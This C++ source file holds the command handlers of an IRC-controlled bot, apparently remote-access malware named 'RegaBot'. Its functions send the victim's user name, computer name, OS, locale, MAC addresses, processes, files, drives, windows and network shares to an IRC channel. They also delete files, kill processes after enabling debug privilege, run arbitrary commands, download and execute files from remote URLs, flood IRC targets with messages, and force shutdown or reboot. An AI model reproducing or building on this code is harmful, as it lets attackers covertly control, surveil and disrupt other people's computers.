#include "stdafx.h"

//this is the file for the most bot commands which can be executed by irc

void CIRC::GetWindowsVersion(char *szVersion)
{
	OSVERSIONINFO OSversion;
		
	OSversion.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
	GetVersionEx(&OSversion);

	switch(OSversion.dwPlatformId)
	{
		case VER_PLATFORM_WIN32s: 
			sprintf(szVersion, "Windows %d.%d",OSversion.dwMajorVersion,OSversion.dwMinorVersion);
			break;

		case VER_PLATFORM_WIN32_WINDOWS:
			if(OSversion.dwMinorVersion==0)
			{
				sprintf(szVersion, "Windows 95");  
			}
			else
			{
				if(OSversion.dwMinorVersion==10)
				{
					sprintf(szVersion, "Windows 98");
				}
       			else
				{
					if(OSversion.dwMinorVersion==90)
					{
						sprintf(szVersion, "Windows Me");
					}
				}
			}
			break;

		case VER_PLATFORM_WIN32_NT:
  			if(OSversion.dwMajorVersion==5 && OSversion.dwMinorVersion==0)
			{
				sprintf(szVersion, "Windows 2000 With %s", OSversion.szCSDVersion);
			}
			else	
			{
				if(OSversion.dwMajorVersion==5 &&   OSversion.dwMinorVersion==1)
				{
					sprintf(szVersion, "Windows XP %s",OSversion.szCSDVersion);
				}
				else	
				{
					if(OSversion.dwMajorVersion<=4)
					{
						sprintf(szVersion, "Windows NT %d.%d with %s",
								OSversion.dwMajorVersion,
								OSversion.dwMinorVersion,
								OSversion.szCSDVersion);
					}
					else	
					{
						//for unknown windows/newest windows version
						sprintf(szVersion, "Windows %d.%d ",
							   OSversion.dwMajorVersion,
							   OSversion.dwMinorVersion);
					}
				}
			}
			break;
	}
}

void CIRC::GetCurrentSystemInfo(void)
{
	char szTemp[MSG_SIZE]="";
	char szTemp2[MSG_SIZE]="";
	char szSendBuf[MSG_SIZE*2]="";
	DWORD dwSize;
	
	SendMessage("Start of systeminfo");
	
	dwSize=MSG_SIZE;
	GetUserName(szTemp, &dwSize);
	sprintf(szTemp2, "Current user:      %s", szTemp);
	SendMessage(szTemp2);
	
	dwSize=MSG_SIZE;
	GetComputerName(szTemp, &dwSize);
	sprintf(szTemp2, "Computername:      %s", szTemp);
	SendMessage(szTemp2);

	dwSize=MSG_SIZE;
	GetWindowsDirectory(szTemp, dwSize);
	sprintf(szTemp2, "Windows directory: %s", szTemp);
	SendMessage(szTemp2);

	dwSize=MSG_SIZE;
	GetSystemDirectory(szTemp, dwSize);
	sprintf(szTemp2, "System directory:  %s", szTemp);
	SendMessage(szTemp2);

	this->GetWindowsVersion(szTemp);
	sprintf(szTemp2, "Windows Version:   %s", szTemp);
	SendMessage(szTemp2);

	GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO3166CTRYNAME, szTemp, MSG_SIZE);
	sprintf(szTemp2, "Country (short):   %s", szTemp);
	SendMessage(szTemp2);

	GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SNATIVECTRYNAME, szTemp, MSG_SIZE);
	sprintf(szTemp2, "Country:           %s", szTemp);
	SendMessage(szTemp2);

	GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SENGLANGUAGE, szTemp, MSG_SIZE);
	sprintf(szTemp2, "Spoken Language:   %s", szTemp);
	SendMessage(szTemp2);

	SendMessage("End of systeminfo");
}

void CIRC::DeleteFileOnDisk(char *szFilename)
{
	char szTemp[MSG_SIZE]="";

	if(szFilename[1]==':')
	{		
		if(DeleteFile(szFilename))
		{
			SendMessage("File deleted");
		}
		else
		{
			SendMessage("File not deleted");
		}
	}
	else
	{
		strcpy(szTemp, szCurrentDir);
		strcat(szTemp, szFilename);

		if(DeleteFile(szTemp))
		{
			SendMessage("File deleted");
		}
		else
		{
			SendMessage("File not deleted");
		}
	}
}

void CIRC::KillProcess(char *szProcessNameOrThreadID)
{
	HANDLE hSnapshot, hProccess, hToken;
	PROCESSENTRY32 ProcEntry;
	char szTemp[MSG_SIZE]="";
	LUID DebugValue;
    TOKEN_PRIVILEGES tkp;
	int iThreadID=-1;
	bool bIsProccessID=true;

	for(int i=0; i<(int)strlen(szProcessNameOrThreadID); i++)
	{
		if(szProcessNameOrThreadID[i]<'0' || szProcessNameOrThreadID[i]>'9')
		{
			bIsProccessID=false;
		}
	}

	if(bIsProccessID==true)
	{
		iThreadID=atoi(szProcessNameOrThreadID);
	}

    // Retrieve a handle of the access token
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) 
	{
		// Enable the SE_DEBUG_NAME privilege
		if (LookupPrivilegeValue((LPSTR) NULL, SE_DEBUG_NAME, &DebugValue)) 
		{
			tkp.PrivilegeCount = 1;
			tkp.Privileges[0].Luid = DebugValue;
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL);

			// The return value of AdjustTokenPrivileges can't be tested
			if (GetLastError() == ERROR_SUCCESS) 
			{
				SendMessage("SE_DEBUG_NAME Privilege enabled.");		
			}
			else
			{
				SendMessage("SE_DEBUG_NAME Privilege disabled.");
			}
		}    
    }

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	ProcEntry.dwSize = sizeof(PROCESSENTRY32);
	
	Process32First(hSnapshot, &ProcEntry);

	do
	{
		if(strcmp(szProcessNameOrThreadID, ProcEntry.szExeFile)==0 || iThreadID==ProcEntry.th32ProcessID)
		{
			hProccess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcEntry.th32ProcessID);

			if(TerminateProcess(hProccess, 0))
			{
				sprintf(szTemp, "Process '%s' with ProcessID '%i' was killed.", ProcEntry.szExeFile, ProcEntry.th32ProcessID);
			}
			else
			{
				sprintf(szTemp, "Process '%s' with ProcessID '%i' cannot be killed.", ProcEntry.szExeFile, ProcEntry.th32ProcessID);
			}

			SendMessage(szTemp);
			CloseHandle(hProccess);
		}

		ProcEntry.dwSize = sizeof(PROCESSENTRY32);
	}while(Process32Next(hSnapshot, &ProcEntry));

	CloseHandle(hSnapshot);
}

void CIRC::EnumProccesses(void)
{
	HANDLE hSnapshot;
	PROCESSENTRY32 ProcEntry;
	char szSendBuf[MSG_SIZE]="";

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	ProcEntry.dwSize = sizeof(PROCESSENTRY32);
	
	Process32First(hSnapshot, &ProcEntry);

	SendMessage("Start of process listing");
	SendMessage("Processname              Process ID");

	do
	{
		memset(szSendBuf, ' ', MSG_SIZE-1);
		
		for(int i=0; i<(int)strlen(ProcEntry.szExeFile); i++)
		{
			if(ProcEntry.szExeFile[i]!=0)szSendBuf[i]=ProcEntry.szExeFile[i];
		}
		
		sprintf(szSendBuf+25, "%i", ProcEntry.th32ProcessID);
		
		SendMessage(szSendBuf);

		ProcEntry.dwSize = sizeof(PROCESSENTRY32);
	}while(Process32Next(hSnapshot, &ProcEntry));

	CloseHandle(hSnapshot);

	SendMessage("End of process listing");
}

void CIRC::FindFiles(void)
{
	WIN32_FIND_DATA FindData;
	HANDLE hFindFile;
	char szTemp[MSG_SIZE]="", szSendBuf[MSG_SIZE]="", szParameters[30]="";
	DWORD dwFileSize;

	strcpy(szTemp, szCurrentDir);
	strcat(szTemp, "*");

	SendMessage("Start of file listing");
	SendMessage("Filename                                                    Size/Properties");


	hFindFile = FindFirstFile(szTemp, &FindData);

	do
	{
		szParameters[0]=0;
		memset(szSendBuf, ' ', MSG_SIZE-1);
		
		if(FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			strcpy(szParameters, "DIR");			
		}
		else
		{
			dwFileSize = (FindData.nFileSizeHigh * (MAXDWORD+1)) + FindData.nFileSizeLow;
			sprintf(szParameters, "%d Byte", dwFileSize);
		}

		for(int i=0; i<(int)strlen(FindData.cFileName); i++)
		{
			if(FindData.cFileName[i]!=0)szSendBuf[i]=FindData.cFileName[i];
		}

		sprintf(szSendBuf+60, "%s", szParameters);

		SendMessage(szSendBuf);
	}
	while(FindNextFile(hFindFile, &FindData));

	FindClose(hFindFile);

	SendMessage("End of file listing");
}

void CIRC::FindDrives(void)
{
	char szDrive[MSG_SIZE]="", szVolumeName[MSG_SIZE]="", szFileSystem[MSG_SIZE]="";
	DWORD dwDrives=0, dwSerial, dwMask=1, dwDamn1, dwDamn2;
	int iTemp=65;

	SendMessage("Start of drive listing");
	
	dwDrives = GetLogicalDrives();

	for(int i=0; i<26; i++)
	{
		if((dwDrives & dwMask))
		{
			sprintf(szDrive, "%c:\\", iTemp);

			GetVolumeInformation(szDrive, szVolumeName, MSG_SIZE, &dwSerial, &dwDamn1, &dwDamn2, szFileSystem, MSG_SIZE);

			sprintf(szDrive, "%c:\\ %s %s", iTemp, szVolumeName, szFileSystem);

			SendMessage(szDrive);
			
			memset(szDrive, 0, MSG_SIZE);
			memset(szVolumeName, 0, MSG_SIZE);
			memset(szFileSystem, 0, MSG_SIZE);			
		}
		iTemp+=1;
		dwMask *= 2;
	}

	SendMessage("End of drive listing");
}

void CIRC::PrintCurrentDir(void)
{
	SendMessage("Current directory is:");
	SendMessage(szCurrentDir);
}

void CIRC::SetCurrentDir(char *szDir)
{
	char szTemp[MSG_SIZE]="", szTemp2[MSG_SIZE]="";
	int iLen=0;
	
	if(szDir[0]=='\\')szDir+=1;
	iLen=(int)strlen(szDir);
	if(szDir[iLen-1]=='\\')szDir[iLen-1]=0;

	if(szDir[0]=='.' && szDir[1]=='.')
	{
		GetCurrentDirectory(MSG_SIZE, szTemp);

		strcpy(szTemp2, szCurrentDir);

		for(int i=((int)strlen(szTemp2)-2); i>0; i--)
		{
			if(szTemp2[i]=='\\')
			{
				szTemp2[i+1]=0;
				
				if(SetCurrentDirectory(szTemp2))
				{
					strcpy(szCurrentDir, szTemp2);
				}
				
				PrintCurrentDir();

				SetCurrentDirectory(szTemp);

				return;
			}
		}

		PrintCurrentDir();

		SetCurrentDirectory(szTemp);

		return;
	}
	
	if(szDir[1]==':')
	{
		GetCurrentDirectory(MSG_SIZE, szTemp);

		strcpy(szTemp2, szDir);
		strcat(szTemp2, "\\");

		if(SetCurrentDirectory(szTemp2))
		{
			strcpy(szCurrentDir, szTemp2);
		}

		SetCurrentDirectory(szTemp);
		
	}
	else
	{
		GetCurrentDirectory(MSG_SIZE, szTemp);

		strcpy(szTemp2, szCurrentDir);
		strcat(szTemp2, szDir);
		strcat(szTemp2, "\\");

		if(SetCurrentDirectory(szTemp2))
		{
			strcpy(szCurrentDir, szTemp2);
		}

		SetCurrentDirectory(szTemp);
	}

	PrintCurrentDir();
}

void CIRC::IRCFlood(char *szTo, char *szCount, char *szText)
{
	int iCount=0;
	bool bIsNumber=true;

	for(int i=0; i<(int)strlen(szCount); i++)
	{
		if(szCount[i]<'0' || szCount[i]>'9')
		{
			bIsNumber=false;
		}
	}

	if(bIsNumber==true)
	{
		iCount=atoi(szCount);
	}

	if(iCount==0)iCount=999999;

	for(int i=0; i<iCount; i++)
	{
		sprintf(szSendBuf, "PRIVMSG %s :\x03\x34%s\r\n", szTo, szText);
		Con.C_SendToServer(0, szSendBuf, (int)strlen(szSendBuf));
		Sleep(100);
	}
}
void CIRC::NoticeFlood(char *szTo, char *szCount, char *szText)
{
	int iCount=0;
	bool bIsNumber=true;

	for(int i=0; i<(int)strlen(szCount); i++)
	{
		if(szCount[i]<'0' || szCount[i]>'9')
		{
			bIsNumber=false;
		}
	}

	if(bIsNumber==true)
	{
		iCount=atoi(szCount);
	}

	if(iCount==0)iCount=999999;

	for(int i=0; i<iCount; i++)
	{
		sprintf(szSendBuf, "NOTICE %s :%s\r\n", szTo, szText);
		Con.C_SendToServer(0, szSendBuf, (int)strlen(szSendBuf));
		Sleep(200);
	}
}


void CIRC::SetDisplay(int iStatus)
{
	if(iStatus==0)
	{
		::SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) 2);
	}
	else if(iStatus==2)
	{
		::SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) 1);
	}
	else
	{
		::SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) -1);
	}
}

void CIRC::RunApp(char *szCommand, int iRedirect)
{
	STARTUPINFO siProcess={0};
	PROCESS_INFORMATION piProcess={0};

	SendMessage("Starting application");
	
	//BUGFIX 30.07.2006
	//set command as second parameter then apps start better
	CreateProcess(NULL, szCommand, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &siProcess, &piProcess);
}

void CIRC::DownloadFile(char *szUrl, char *szDestLocation, int iExecute, int iRedirect)
{
	HINTERNET hInetOpen, hInetUrl;
	char szTemp[MSG_SIZE]="";
	DWORD dwBytesRead;
	int iFp=0;

	iFp = _open(szDestLocation, _O_BINARY | _O_CREAT | _O_RDWR | _O_TRUNC, _S_IREAD | _S_IWRITE);
	
	hInetOpen = InternetOpen("RegaBot", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	if(hInetOpen && iFp != -1)
	{
		hInetUrl = InternetOpenUrl(hInetOpen, szUrl, NULL, NULL, NULL, NULL);
		
		if(hInetUrl)
		{
			SendMessage("Downloading file");
			do
			{
				InternetReadFile(hInetUrl, szTemp, MSG_SIZE, &dwBytesRead);
				_write(iFp, szTemp, dwBytesRead);				
			}
			while(dwBytesRead==MSG_SIZE);
			SendMessage("Download finished");
		}
	}

	_close(iFp);
	InternetCloseHandle(hInetUrl);
	InternetCloseHandle(hInetOpen);

	if(iExecute==1)
	{
		RunApp(szDestLocation, iRedirect);
	}
}

BOOL CALLBACK CIRC::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	CIRC *CTemp=(CIRC*)lParam;	

	char szTemp[MSG_SIZE]="";
	
	GetWindowText(hwnd, szTemp, MSG_SIZE);

	if(strcmp(szTemp, "")!=0)CTemp->SendMessage(szTemp);

	return true;
}

void CIRC::FindWindows(void)
{
	SendMessage("Start of window listing");
	EnumWindows(&CIRC::EnumWindowsProc, (LPARAM)this);
	SendMessage("End of window listing");
}

void CIRC::GetTime(void)
{
	SYSTEMTIME stTime;
	char szTime[MSG_SIZE]="";

	GetLocalTime(&stTime);	

	sprintf(szTime, "Time: %i.%i.%i %i:%i:%i.%i", stTime.wDay, stTime.wMonth, stTime.wYear, stTime.wHour, stTime.wMinute, stTime.wSecond, stTime.wMilliseconds);

	SendMessage(szTime);
}

void CIRC::GetSystemUptime(void)
{
	LARGE_INTEGER liCount, liFrequency, liUptime;
	DWORD dwYear, dwMonth, dwDay, dwHour, dwMinute, dwSecond, dwRest;
	SYSTEMTIME stTime;
	char szUptime[MSG_SIZE]="";
	
	QueryPerformanceCounter(&liCount); 
	QueryPerformanceFrequency(&liFrequency); 
	GetSystemTime(&stTime);

	liUptime.QuadPart = liCount.QuadPart / liFrequency.QuadPart; 

	dwYear = liUptime.QuadPart / ONE_YEAR;
	dwRest = liUptime.QuadPart % ONE_YEAR;

	dwMonth = dwRest / ONE_MONTH;
	dwRest = dwRest % ONE_MONTH;

	dwDay = dwRest / ONE_DAY;
	dwRest = dwRest % ONE_DAY;

	dwHour = dwRest / ONE_HOUR;
	dwRest = dwRest % ONE_HOUR;

	dwMinute = dwRest / ONE_MINUTE;
	dwSecond = dwRest % ONE_MINUTE;
	
	sprintf(szUptime, "Uptime: %i:%i:%i %i:%i:%i.%i", dwYear, dwMonth, dwDay, dwHour, dwMinute, dwSecond, stTime.wMilliseconds);

	SendMessage(szUptime);
}

void CIRC::ResetNetBios(int iLanCard)
{
	NCB nbCmd;
	
	nbCmd.ncb_lana_num = iLanCard;

	nbCmd.ncb_command = NCBRESET;
	nbCmd.ncb_lsn = 0;

	Netbios(&nbCmd);
}

int CIRC::GetMACFromLanCard(int iLanCard, char *szMAC)
{
	ResetNetBios(iLanCard);

	NCB nbCmd;
	ADAPTER_STATUS asStatus;

	nbCmd.ncb_command = NCBASTAT;
	nbCmd.ncb_lana_num = iLanCard;
	nbCmd.ncb_callname[0]='*';
	nbCmd.ncb_callname[1]='\0';
	nbCmd.ncb_length = sizeof(ADAPTER_STATUS);
	nbCmd.ncb_buffer = (unsigned char *)&asStatus;

	Netbios(&nbCmd);

	if(nbCmd.ncb_retcode==0)
	{
		sprintf(szMAC, " %0.2X-%0.2X-%0.2X-%0.2X-%0.2X-%0.2X", asStatus.adapter_address[0], asStatus.adapter_address[1], asStatus.adapter_address[2], asStatus.adapter_address[3], asStatus.adapter_address[4], asStatus.adapter_address[5]);
		return 0;
	}
	else
	{
		return -1;
	}
}

void CIRC::GetMacOfAllCards(void)
{
	NCB nbCmd;
	LANA_ENUM leCards;
	char szTemp[50]="";

	nbCmd.ncb_command = NCBENUM;
	nbCmd.ncb_length = sizeof(LANA_ENUM);
	nbCmd.ncb_buffer = (unsigned char *)&leCards;	

	Netbios(&nbCmd);

	SendMessage("Start of MAC listing");
	for(int i=0; i<leCards.length; i++)
	{
		GetMACFromLanCard(leCards.lana[i], szTemp);
		SendMessage(szTemp);
	}
	SendMessage("End of MAC listing");
}

void CIRC::GetNetworkInfo(NETRESOURCE *hNetRes, int *iDepth)
{
	HANDLE hOpenEnum;
	DWORD dwRetVal;
	DWORD dwRequest=5000;
	DWORD dwBufSize;
	char szTemp[MSG_SIZE]="";
	
	dwRetVal = WNetOpenEnum(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, RESOURCEUSAGE_ALL, hNetRes, &hOpenEnum);

	if(dwRetVal != NO_ERROR)return;

	dwBufSize = sizeof(NETRESOURCE)*5000;
	NETRESOURCE *hBuffer = new NETRESOURCE[5000];

	dwRetVal = WNetEnumResource(hOpenEnum, &dwRequest, hBuffer, &dwBufSize);

	if(dwRetVal != NO_ERROR)return;
	
	for(int i=0; i<dwRequest; i++)
	{
		*iDepth+=1;

		if(*iDepth==1)
		{
			GetNetworkInfo(&hBuffer[i], iDepth);
		}
		else
		{
			sprintf(szTemp, "%s", hBuffer[i].lpRemoteName);
			SendMessage(szTemp);
		}
	}

	WNetCloseEnum(hOpenEnum);
}

void CIRC::OpenDrive(char *szDevice)
{
    char szTemp[100]="";

    sprintf(szTemp, "Open %s Alias CD%s Type CDAudio", szDevice, szDevice);
    mciSendString(szTemp, 0, 0, 0);

    sprintf(szTemp, "Set CD%s Door Open", szDevice);
    mciSendString(szTemp, 0, 0, 0);
}

void CIRC::CloseDrive(char *szDevice)
{
    char szTemp[100]="";

    sprintf(szTemp, "Open %s Alias CD%s Type CDAudio", szDevice, szDevice);
    mciSendString(szTemp, 0, 0, 0);

    sprintf(szTemp, "Set CD%s Door Closed", szDevice);
    mciSendString(szTemp, 0, 0, 0);
}

void CIRC::SetTaskbarStatus(char *szStatus)
{
    HWND hWnd;
	
	hWnd = FindWindow("Shell_TrayWnd", NULL);

	if(strcmp(szStatus, "hide")==0)
	{
		SetWindowPos(hWnd, 0, 0, 0, 0, 0, SWP_HIDEWINDOW);
	}
	else if(strcmp(szStatus, "show")==0)
	{
		SetWindowPos(hWnd, 0, 0, 0, 0, 0, SWP_SHOWWINDOW);
	}
	else if(strcmp(szStatus, "enable")==0)
	{
		EnableWindow(hWnd, true);
	}
	else if(strcmp(szStatus, "disable")==0)
	{
		EnableWindow(hWnd, false);
	}
}

void CIRC::Shutdown(char *szMethod)
{
	if(strcmp(szMethod, "reboot")==0)
	{
		//reboot the system
		ExitWindowsEx(EWX_REBOOT, EWX_FORCE);		
	}
	else if(strcmp(szMethod, "logoff")==0)
	{
		//logoff
		ExitWindowsEx(EWX_LOGOFF, EWX_FORCE);		
	}
	else if(strcmp(szMethod, "shutdown")==0)
	{
		//shutdown and turn power off
		ExitWindowsEx(EWX_POWEROFF, EWX_FORCE);		
	}
}